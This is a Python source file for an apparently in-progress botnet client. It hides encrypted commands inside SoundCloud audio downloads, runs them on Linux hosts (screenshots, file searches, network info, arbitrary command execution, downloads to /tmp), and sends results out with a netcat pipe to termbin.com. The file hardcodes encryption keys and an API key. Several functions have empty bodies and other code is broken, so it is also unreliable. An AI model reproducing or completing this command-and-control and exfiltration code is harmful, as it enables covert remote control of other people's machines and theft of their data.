import json
import crypt
import time
import base64
import re

from subprocess import call,check_output
from os import system

#Maybe implement sockets instead of needing this library
try:
    import requests
except ImportError as e:
    system("sudo pip install -q requests")

__HASHTAGS__ = "drunk storytelling"
__ENC_KEY__ = "CA7BB2E586B2297911228D570632B838D15FAD6776E28F09E0381A28854C02CA"
__IV__ = "DADE575D41C4EDAFE55798C7B869C6E2"


def encrypt(string):
#Aes256-cbc

def decrypt(string):


class Bot:
    def __init__(self):
        self.apiKey = "1031bab2ce2395cb86acee82de84cec0"
        self.postData = {"UID":"", "Command":"", "XfilData":"", "Time":""}
        self.oldSongs = []

    #Send requests to soundcloud
    @staticmethod
    def request(self):
        if len(self.oldSongs) > 10:
                del self.oldSongs[10:len(self.oldSongs)]

        r = requests.get("http://api.soundcloud.com/tracks.json?client_id=" + self.apiKey + "&tags=" + __HASHTAGS__)


        while 400 >= r.status_code <= 499:
            #API Key has been burned, need a new one
            #TODO:Create soundcloud user account to look at the buy link and get the new api key!
            #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat

            #This will need some refining
            r = requests.get()
            found = r.text.find('buy')
            #Chop off the .com and just take the api key
            newKey = r.text[found.start():found.end()-4]

            if newKey != self.apiKey:
                self.apiKey = newKey
                return None
            else:
                self.postData['XfilData'] = "API KEY NO LONGER WORKS"
                return None


        webjson = r.json()
        dl_array = []
        for song_num in xrange(len(webjson)):
            if webjson[song_num]['id'] in self.oldSongs:
                continue

            self.oldSongs.insert(0, webjson[song_num]['id'])

            dl_url = webjson[song_num]['download_url'] + "?client_id=" + self.apiKey
            dl_array.append(dl_url)

        enc_command_array = []
        command_array = []
        for song in dl_array:
            r = requests.get(song)
            it = re.finditer('(00[2-7][0-9a-f]){8,}',r.text)

            #Pull out every string in the .wma file
            for obj in it:
                enc_command_array.append(obj.group(0))

        #Do command validation here
        plaintext = []
        for command in enc_command_array:
            plaintext.append(decrypt(base64.b64decode(command)))

        for index in xrange(len(plaintext)):
            if plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or \
                plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":

                command_array.append(plaintext[index])
                command_array.append(plaintext[index+1])

        return command_array


    #Post data to termbin
    @staticmethod
    def post_data(self):
        self.postData['Time'] = time.ctime()
        encData = base64.b64encode(encrypt(str(self.postData)))

        call(['echo ' + encData + ' | nc termbin.com 9999'], shell=True)

    #Take screenshot
    @staticmethod
    def take_screenshot():


    #Search each file on the system for a specific string
    @staticmethod
    def search_string(self, string):


    #Get networking information
    @staticmethod
    def net_info(self):
        self.postData['Command'] = 'net_info'
        self.postData['XfilData'] = check_output(['ifconfig'])


    #Execute commands locally
    @staticmethod
    def rce_linux(self, command):
        self.postData['Command'] = 'rce_linux:' + command
        self.postData['XfilData'] = check_output([command])


    #Querry website for continuous integration
    @staticmethod
    def pull_resource(self, info):
        self.postData['Command'] = 'pull_resource'
        r = requests.get(info)
        with open('/tmp/awdf','w') as RESOURCE:
            RESOURCE.write(r.text)


if __name__ == "__main__":

    bender = Bot()

    while True:
        #Figure out how each method will be called once command is returned
        command = bender.request()

        if command is None:
            #Check back in 1hr, this is done if the API key has been burned. Determined in Bot.request()
            time.sleep(60 * 60)
            continue

        count = 0
        for item in command:
            #Might need to change this, depends if the command or the arguments are first
            if count % 2 == 0:
                continue

            if item == 'take_screenshot':
                bender.take_screenshot()
                bender.post_data()

            elif item == 'search_string':
                #This might need to change depending on the order of the items in the array
                bender.search_string(command[count+1])
                bender.post_data()


            elif item == 'net_info':
                bender.net_info()
                bender.post_data()

            elif item == 'rce_linux':
                #This might need to change depending on the order of the items in the array
                bender.rce_linux(command[count+1])
                bender.post_data()

            elif item == 'pull_resource':
                bender.pull_resource(command[count+1])

        #Make random between 2-5hrs
        time.sleep(60 * 60 * 3)